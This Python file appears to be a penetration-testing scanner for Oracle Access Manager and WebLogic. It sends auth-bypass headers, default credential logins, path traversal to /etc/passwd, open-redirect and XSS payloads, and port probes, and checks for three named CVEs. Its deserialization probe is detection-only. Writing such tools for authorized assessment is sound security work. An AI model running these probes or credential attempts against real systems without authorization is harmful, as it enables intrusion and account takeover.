#!/usr/bin/env python3
"""
Oracle Access Manager (OAM) Scanner
Security Assessment Tool for Oracle Access Manager
Target: Oracle Access Manager SSO server

Usage:
  python3 oam_scan.py --target <oam-host>
  python3 oam_scan.py --target <oam-host> --port 14100
  python3 oam_scan.py --target <oam-host> --proxy http://127.0.0.1:8080

Key CVEs:
  CVE-2021-35587  CVSS 9.8  Pre-auth RCE in OAM 11.1.2.3 / 12.2.1.3
  CVE-2022-21371  CVSS 7.5  OAM improper authentication bypass
  CVE-2021-2342   CVSS 6.1  OAM XSS
"""

import sys, ssl, io, json, re, time, argparse
import urllib.request, urllib.parse, urllib.error
from datetime import datetime

# ── ANSI colors ───────────────────────────────────────────────────────────────
R='\033[91m'; Y='\033[93m'; G='\033[92m'; B='\033[94m'
M='\033[95m'; C='\033[96m'; W='\033[97m'; BD='\033[1m'; RS='\033[0m'

def crit(m): print(f"\n{BD}{R}[★ CRITICAL]{RS} {m}")
def high(m): print(f"{R}[▲ HIGH    ]{RS} {m}")
def med(m):  print(f"{Y}[● MEDIUM  ]{RS} {m}")
def low(m):  print(f"{C}[○ LOW     ]{RS} {m}")
def ok(m):   print(f"{G}[✓ SAFE    ]{RS} {m}")
def info(m): print(f"{B}[i INFO    ]{RS} {m}")
def run(m):  print(f"{M}[→ TESTING ]{RS} {m}")
def step(m): print(f"\n{BD}{W}{'─'*60}{RS}\n{BD}{W}  {m}{RS}\n{BD}{W}{'─'*60}{RS}")
def pwn(m):
    print(f"\n{BD}{R}{'═'*60}{RS}")
    print(f"{BD}{R}  [★ VULNERABLE — CONFIRMED]{RS}")
    print(f"{BD}{R}{'═'*60}{RS}\n{m}\n{BD}{R}{'═'*60}{RS}\n")

RESULTS = []
def record(sev, cve, msg): RESULTS.append((sev, cve, msg))

# ── HTTP helpers ──────────────────────────────────────────────────────────────
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE
PROXY = None
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125 Safari/537.36'

def _opener(follow=False):
    handlers = [urllib.request.HTTPSHandler(context=_ctx)]
    if PROXY:
        handlers.insert(0, urllib.request.ProxyHandler({'https': PROXY, 'http': PROXY}))
    if not follow:
        class NoRedir(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **kw): return None
        handlers.append(NoRedir())
    return urllib.request.build_opener(*handlers)

def req(url, method='GET', data=None, hdrs=None, timeout=12, follow=False, scheme='https'):
    h = {'User-Agent': UA}
    if hdrs: h.update(hdrs)
    if isinstance(data, str): data = data.encode()
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        resp = _opener(follow).open(r, timeout=timeout)
        body = resp.read()
        return resp.status, dict(resp.headers), body.decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        body = e.read().decode('utf-8', errors='replace') if e.fp else ''
        return e.code, dict(e.headers), body
    except Exception as e:
        return 0, {}, str(e)

def u(target, port, path, scheme='https'):
    p = f":{port}" if port not in (443, 80) else ''
    return f"{scheme}://{target}{p}{path}"

# ── CVE Tests ─────────────────────────────────────────────────────────────────

def test_connectivity(target, port):
    step("CONNECTIVITY CHECK — Oracle Access Manager")
    for path in ['/accessgate/ssologin', '/oam/server/auth_cred_submit', '/', '/oamconsole']:
        run(f"Probing {path} ...")
        code, hdrs, body = req(u(target, port, path), timeout=10)
        info(f"  HTTP {code}  size={len(body)}  {path}")
        if code not in (0,):
            # Try to identify OAM
            if any(kw in body for kw in ['Oracle Access', 'OAM', 'ssologin', 'accessgate']):
                ok(f"OAM confirmed at {path} (HTTP {code})")
                return True
            elif code == 200:
                ok(f"Server responding HTTP 200 at {path}")
                return True
    # Try plain HTTP
    run("Trying plain HTTP ...")
    code, _, body = req(u(target, 80 if port==443 else port, '/accessgate/ssologin', scheme='http'), timeout=8)
    if code not in (0,):
        ok(f"Responding on HTTP (code {code})")
        return True
    return False

def test_cve_2021_35587(target, port):
    """
    CVE-2021-35587 — Oracle Access Manager pre-auth RCE (CVSS 9.8)
    Affects: OAM 11.1.2.3.0 / 12.2.1.3.0 / 12.2.1.4.0 (Jan 2022 CPU patches it)
    Vector: /iam/admin/config/discovery via crafted XML deserialization
    """
    step("CVE-2021-35587 — OAM Pre-Auth RCE (CVSS 9.8)")

    vuln_paths = [
        '/iam/admin/config/discovery',
        '/iam/admin/config/discovery;jsessionid=x',
        '/oam/admin/api/v1/config/discovery',
        '/ms_oauth/oauth2/endpoints/oauthservice/discovery',
    ]

    # Step 1: Check if admin paths accessible
    for p in vuln_paths:
        run(f"Probing {p} ...")
        code, hdrs, body = req(u(target, port, p), timeout=10)
        info(f"  HTTP {code}  size={len(body)}")
        if code == 200:
            high(f"Admin endpoint accessible without auth! Path: {p}")
            info(f"  Body: {body[:200]!r}")
            record('CRITICAL', 'CVE-2021-35587', f'OAM admin endpoint accessible: {p}')
            # Step 2: Probe deserialization
            _probe_35587_deser(target, port, p)
            return
        elif code == 401:
            med(f"  {p} → HTTP 401 (auth required — still worth probing bypass)")
        elif code == 404:
            info(f"  {p} → 404 (path not present)")
        elif code == 403:
            med(f"  {p} → 403 (blocked but may exist)")

    # Step 2: Auth bypass variants
    run("Testing auth bypass headers ...")
    bypass_hdrs = [
        {'X-Remote-User': 'oamadmin'},
        {'X-Forwarded-For': '127.0.0.1', 'X-Remote-User': 'admin'},
        {'Authorization': 'Basic b2FtYWRtaW46b2FtYWRtaW4='},  # oamadmin:oamadmin
    ]
    for bh in bypass_hdrs:
        code, _, body = req(u(target, port, '/iam/admin/config/discovery'),
                            hdrs=bh, timeout=10)
        if code == 200:
            high(f"Auth bypass via headers succeeded! Headers: {bh}")
            record('CRITICAL', 'CVE-2021-35587', f'Auth bypass succeeded with headers: {bh}')
            _probe_35587_deser(target, port, '/iam/admin/config/discovery', extra_hdrs=bh)
            return
        info(f"  Bypass {list(bh.keys())[0]} → HTTP {code}")

    ok("CVE-2021-35587: Admin discovery endpoint not accessible (patched or path differs)")
    record('LOW', 'CVE-2021-35587', 'Admin endpoint not reachable — Jan 2022 CPU likely applied')

def _probe_35587_deser(target, port, path, extra_hdrs=None):
    """Send detection payload for CVE-2021-35587 deserialization"""
    run("Sending CVE-2021-35587 detection probe (XML) ...")
    # Detection XML — causes different response on vulnerable vs patched (no actual exec)
    xml = b"""<?xml version="1.0"?>
<OAMConfig><OAMComponent name="detectionProbe"><attribute name="CVE-2021-35587"/></OAMComponent></OAMConfig>"""
    hdrs = {'Content-Type': 'application/xml'}
    if extra_hdrs: hdrs.update(extra_hdrs)
    code, _, body = req(u(target, port, path), method='POST', data=xml, hdrs=hdrs, timeout=15)
    info(f"  Deser probe → HTTP {code}  size={len(body)}")
    if code == 500:
        high(f"HTTP 500 on deser probe — possible vulnerable deserialization endpoint!")
        info(f"  Body: {body[:300]!r}")
        record('HIGH', 'CVE-2021-35587', f'HTTP 500 on XML probe — deserialization likely vulnerable')
    elif code == 200:
        info(f"  Body: {body[:200]!r}")

def test_cve_2022_21371(target, port):
    """CVE-2022-21371 — OAM improper authentication (CVSS 7.5)"""
    step("CVE-2022-21371 — OAM Improper Authentication Bypass (CVSS 7.5)")

    # Parameter manipulation on ssologin endpoint
    test_cases = [
        '/accessgate/ssologin?successUrl=https://evil.example.com',
        '/accessgate/ssologin?OAM_REQ=../../../../etc/passwd',
        '/oam/server/auth_cred_submit?username=admin%00&password=x',
    ]
    for p in test_cases:
        run(f"Testing {p[:60]} ...")
        code, hdrs, body = req(u(target, port, p), timeout=10)
        loc = hdrs.get('Location', '')
        info(f"  HTTP {code}  loc={loc[:80]}")
        if 'evil.example.com' in loc:
            high(f"Open redirect via OAM ssologin! Location: {loc}")
            record('HIGH', 'CVE-2022-21371', f'OAM open redirect confirmed: {loc}')
        if 'root:' in body or '/bin/' in body:
            crit(f"Path traversal in OAM! File contents exposed")
            record('CRITICAL', 'CVE-2022-21371', f'Path traversal: {body[:200]}')

    # Auth header bypass
    run("Testing empty/null auth bypass ...")
    for auth_val in ['', 'null', 'undefined', 'true']:
        code, hdrs, body = req(
            u(target, port, '/oamconsole/faces/sign-in'),
            hdrs={'Authorization': auth_val}, timeout=8
        )
        if code == 200 and 'sign-in' not in body.lower():
            high(f"Auth bypass with Authorization: '{auth_val}' — unexpected 200")
            record('HIGH', 'CVE-2022-21371', f'Auth bypass: Authorization: {auth_val!r} returned HTTP 200')
        else:
            info(f"  Authorization: {auth_val!r} → HTTP {code}")

    record('MEDIUM', 'CVE-2022-21371', 'OAM auth parameter tests completed — review manually')

def test_oam_admin_console(target, port):
    """OAM Admin Console + WebLogic console exposure"""
    step("OAM Admin Console & WebLogic Console Exposure")

    consoles = [
        ('/oamconsole',                     'OAM Admin Console'),
        ('/oamconsole/faces/sign-in',        'OAM Admin Login'),
        ('/console',                         'WebLogic Admin Console'),
        ('/console/j_security_check',        'WebLogic Login Endpoint'),
        ('/iam/admin',                       'IAM Admin'),
        ('/em',                              'Enterprise Manager'),
        ('/oam/server/info',                 'OAM Server Info'),
    ]
    for path, label in consoles:
        code, hdrs, body = req(u(target, port, path), timeout=10)
        info(f"  HTTP {code}  [{label}]  {path}")
        if code == 200 and len(body) > 200:
            high(f"{label} is ACCESSIBLE (HTTP 200, {len(body)} bytes)!")
            if 'weblogic' in body.lower() or 'WebLogic' in body:
                high(f"  WebLogic interface confirmed in response")
            if 'password' in body.lower() and 'username' in body.lower():
                high(f"  Login form present — credential attack surface exposed")
            record('HIGH', 'Admin-Console', f'{label} accessible at {path}')
        elif code == 302:
            loc = hdrs.get('Location', '')
            info(f"  → redirect to {loc[:80]}")

def test_default_creds(target, port):
    """Test OAM/WebLogic default credentials"""
    step("Default Credentials Test — OAM & WebLogic")
    print(f"{Y}  Testing known defaults only — no brute force{RS}\n")

    cred_pairs = [
        ('weblogic',  'weblogic1'),
        ('weblogic',  'Welcome1'),
        ('weblogic',  'weblogic'),
        ('oamadmin',  'oamadmin'),
        ('oamadmin',  'Welcome1'),
        ('oimadmin',  'oimadmin'),
        ('admin',     'admin'),
    ]

    # WebLogic console login
    wl_path = '/console/j_security_check'
    run(f"Testing WebLogic console login at {wl_path} ...")
    for user, pwd in cred_pairs:
        data = urllib.parse.urlencode({'j_username': user, 'j_password': pwd,
                                       'j_character_encoding': 'UTF-8'})
        code, hdrs, body = req(
            u(target, port, wl_path), method='POST',
            data=data.encode(),
            hdrs={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )
        loc = hdrs.get('Location', '')
        if code in (302, 301) and 'LoginError' not in loc and 'sign-in' not in loc.lower():
            pwn(f"WebLogic default credentials VALID!\n  user: {user}  pass: {pwd}\n  Redirect: {loc}")
            record('CRITICAL', 'Default-Creds', f'WebLogic console login: {user}:{pwd} → {loc}')
            return
        elif code == 200 and 'invalid' not in body.lower():
            high(f"Unexpected 200 for {user}:{pwd} — check manually")
        info(f"  {user}:{pwd} → HTTP {code}")
        time.sleep(0.3)

    # OAM ssologin POST
    oam_path = '/accessgate/ssologin'
    run(f"Testing OAM ssologin at {oam_path} ...")
    for user, pwd in cred_pairs[:4]:
        data = urllib.parse.urlencode({'usernameField': user, 'passwordField': pwd})
        code, hdrs, body = req(
            u(target, port, oam_path), method='POST',
            data=data.encode(),
            hdrs={'Content-Type': 'application/x-www-form-urlencoded'},
            timeout=10
        )
        loc = hdrs.get('Location', '')
        if code in (302, 301):
            if 'error' not in loc.lower() and 'fail' not in loc.lower():
                pwn(f"OAM login redirect — possible valid creds!\n  user: {user}  pass: {pwd}\n  Location: {loc}")
                record('CRITICAL', 'Default-Creds', f'OAM ssologin {user}:{pwd} → {loc}')
            else:
                info(f"  {user}:{pwd} → redirect to error page")
        else:
            info(f"  {user}:{pwd} → HTTP {code}")
        time.sleep(0.3)

    ok("No default credentials worked on tested endpoints")
    record('LOW', 'Default-Creds', 'Default credential pairs did not authenticate')

def test_oam_info_disclosure(target, port):
    """OAM version, server info, and parameter injection"""
    step("OAM Information Disclosure & Parameter Injection")

    # Server info endpoints
    info_paths = [
        '/oam/server/info',
        '/oam/version.txt',
        '/accessgate/version',
        '/.well-known/openid-configuration',
        '/ms_oauth/oauth2/endpoints/oauthservice/discovery',
        '/oam/server/obrareq.cgi',
    ]
    for p in info_paths:
        code, hdrs, body = req(u(target, port, p), timeout=8)
        info(f"  HTTP {code}  size={len(body)}  {p}")
        if code == 200 and len(body) > 50:
            high(f"Info endpoint accessible: {p}")
            info(f"  Body: {body[:300]!r}")
            record('MEDIUM', 'Info-Disclosure', f'OAM info at {p}: {body[:150]}')

    # OAM open redirect via successUrl / backUrl
    run("Testing OAM open redirect via successUrl/backUrl ...")
    for param in ['successUrl', 'backUrl', 'returnUrl', 'redirect', 'goto']:
        test_url = f'/accessgate/ssologin?{param}=https://evil.example.com'
        code, hdrs, body = req(u(target, port, test_url), timeout=8)
        loc = hdrs.get('Location', '')
        if 'evil.example.com' in loc:
            high(f"Open redirect via {param}! Location: {loc}")
            record('HIGH', 'Open-Redirect', f'OAM {param} param passes to Location: {loc}')
        else:
            info(f"  {param} → HTTP {code} loc={loc[:60]}")

    # Password in redirect check via OAM ssologin endpoint
    run("Checking if password exposed in OAM redirect URL ...")
    data = urllib.parse.urlencode({'usernameField': 'PENTEST_USER', 'passwordField': 'VISIBLE_PASS_TEST'})
    code, hdrs, body = req(
        u(target, port, '/accessgate/ssologin'), method='POST',
        data=data.encode(),
        hdrs={'Content-Type': 'application/x-www-form-urlencoded'},
        timeout=10
    )
    loc = hdrs.get('Location', '')
    if 'VISIBLE_PASS_TEST' in loc:
        high(f"PASSWORD in OAM redirect URL! Location: {loc[:200]}")
        record('HIGH', 'Credential-Exposure', f'OAM ssologin exposes password in Location: {loc[:200]}')
    elif loc:
        info(f"  POST ssologin → HTTP {code} → {loc[:100]}")

    # Server headers
    run("Checking server/version headers ...")
    code, hdrs, body = req(u(target, port, '/accessgate/ssologin'), timeout=8)
    for h in ['Server', 'X-Powered-By', 'X-Oracle-DMS-ECID', 'X-ORACLE-DMS-ECID']:
        val = hdrs.get(h, hdrs.get(h.lower(), ''))
        if val:
            info(f"  {h}: {val}")
            record('LOW', 'Info-Disclosure', f'Header {h}: {val}')

def test_oam_xss(target, port):
    """CVE-2021-2342 — OAM reflected XSS"""
    step("CVE-2021-2342 — OAM Reflected XSS (CVSS 6.1)")
    xss_payloads = [
        '/accessgate/ssologin?username=<script>alert(1)</script>',
        '/accessgate/ssologin?errorCode=<img src=x onerror=alert(1)>',
        '/oam/server/auth_cred_submit?login_service=<svg onload=alert(1)>',
    ]
    for p in xss_payloads:
        code, _, body = req(u(target, port, p), timeout=8)
        if any(x in body for x in ['<script>alert(1)', '<img src=x onerror', '<svg onload']):
            high(f"XSS reflected! {p[:80]}")
            record('HIGH', 'CVE-2021-2342', f'Reflected XSS at {p[:80]}')
        else:
            info(f"  XSS payload → HTTP {code} (not reflected or encoded)")
    record('LOW', 'CVE-2021-2342', 'XSS payloads tested — check responses manually in browser')

def test_oam_ports(target):
    """Probe common OAM/WLS ports"""
    step("OAM / WebLogic Port Discovery")
    ports = [
        (443,   'HTTPS'),
        (80,    'HTTP'),
        (7001,  'WLS Admin HTTP'),
        (7002,  'WLS Admin HTTPS'),
        (14100, 'OAM Managed Server'),
        (14101, 'OAM Managed Server Alt'),
        (5575,  'OAM OAP port'),
    ]
    open_ports = []
    for port, label in ports:
        try:
            s = __import__('socket').create_connection((target, port), timeout=4)
            s.close()
            info(f"  PORT {port} OPEN  [{label}]")
            open_ports.append((port, label))
        except:
            info(f"  Port {port} closed/filtered  [{label}]")
    if open_ports:
        record('MEDIUM', 'Port-Exposure', f'Open ports on OAM server: {open_ports}')
    return [p for p, _ in open_ports]

# ── Summary ───────────────────────────────────────────────────────────────────

def print_summary(start, target):
    elapsed = time.time() - start
    print(f"\n\n{BD}{W}{'═'*60}{RS}")
    print(f"{BD}{W}  OAM SCAN SUMMARY — {target}{RS}")
    print(f"{BD}{W}  Duration: {elapsed:.1f}s  |  {datetime.now().strftime('%Y-%m-%d %H:%M')}{RS}")
    print(f"{BD}{W}{'═'*60}{RS}\n")
    order = ['CRITICAL','HIGH','MEDIUM','LOW','INFO']
    cmap  = {'CRITICAL':BD+R,'HIGH':R,'MEDIUM':Y,'LOW':C,'INFO':B}
    for sev in order:
        fs = [(c,m) for s,c,m in RESULTS if s==sev]
        if not fs: continue
        print(f"{cmap.get(sev,W)}[{sev}]{RS}")
        for cve, msg in fs:
            print(f"  • {BD}{cve}{RS}: {msg.split(chr(10))[0][:90]}")
        print()
    crits = sum(1 for s,_,_ in RESULTS if s=='CRITICAL')
    highs = sum(1 for s,_,_ in RESULTS if s=='HIGH')
    print(f"{'─'*60}")
    print(f"  {BD}{R}{crits} CRITICAL{RS}  {R}{highs} HIGH{RS}")
    if crits:
        print(f"\n  {BD}{R}★ IMMEDIATE ACTION — Critical OAM finding confirmed{RS}")
    print(f"{'═'*60}\n")

def banner(target, port):
    print(f"""
{BD}{C}
  ╔═══════════════════════════════════════════════════════╗
  ║      Oracle Access Manager (OAM) Scanner             ║
  ║      Authorized Internal Penetration Test            ║
  ║      Authorized Security Assessment                  ║
  ╚═══════════════════════════════════════════════════════╝{RS}
  Target : {BD}{target}:{port}{RS}
  Time   : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
  {R}Authorized testing only — use responsibly{RS}
""")

def main():
    global PROXY
    ap = argparse.ArgumentParser()
    ap.add_argument('--target', required=True)
    ap.add_argument('--port',   type=int, default=443)
    ap.add_argument('--proxy',  default=None)
    args = ap.parse_args()
    if args.proxy:
        PROXY = args.proxy

    start = time.time()
    banner(args.target, args.port)

    alive = test_connectivity(args.target, args.port)
    if not alive:
        print(f"\n{R}Target unreachable — check DNS / VPN / port.{RS}")
        print(f"{Y}Tip: try --port 14100 or --port 7002 for direct WLS{RS}\n")
        sys.exit(1)

    open_ports = test_oam_ports(args.target)

    # Run all CVE tests on primary port
    test_cve_2021_35587(args.target, args.port)
    test_cve_2022_21371(args.target, args.port)
    test_oam_admin_console(args.target, args.port)
    test_default_creds(args.target, args.port)
    test_oam_info_disclosure(args.target, args.port)
    test_oam_xss(args.target, args.port)

    # If extra ports found open, probe them too
    extra = [p for p in open_ports if p not in (args.port, 443, 80)]
    for ep in extra:
        print(f"\n{BD}{Y}  Re-running console + cred tests on open port {ep} ...{RS}")
        test_oam_admin_console(args.target, ep)

    print_summary(start, args.target)

if __name__ == '__main__':
    main()
